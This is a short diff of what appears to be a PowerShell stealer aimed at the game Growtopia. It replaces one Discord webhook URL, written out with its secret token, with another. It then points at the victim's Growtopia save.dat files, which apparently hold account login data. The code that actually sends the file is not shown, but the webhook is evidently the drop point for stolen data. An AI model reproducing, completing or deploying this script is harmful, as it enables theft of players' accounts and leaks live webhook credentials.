@@ -1,4 +1,4 @@
-$webhookUrl='https://discord.com/api/webhooks/1347454008037609504/Wcjv87xpJtqQF9QsthvBio5hNeQE0YjLO5j91geZIsiAK8FtJOzyByKHBQ1rm6c_F39z'
+$webhookUrl='https://discord.com/api/webhooks/1348544359737462834/ktN7tjHCsfAgOCH4YgvVM2-vRurixxwjPdhRXUKSRbZ4cKKOAklSRhy1RjRezHteCl2U'
 $userProfile = $env:USERPROFILE
 $paths = @("$userProfile\AppData\Local\Growtopia\save.dat", "$userProfile\AppData\Local\Growtopia\save")
 $foundFile = $null
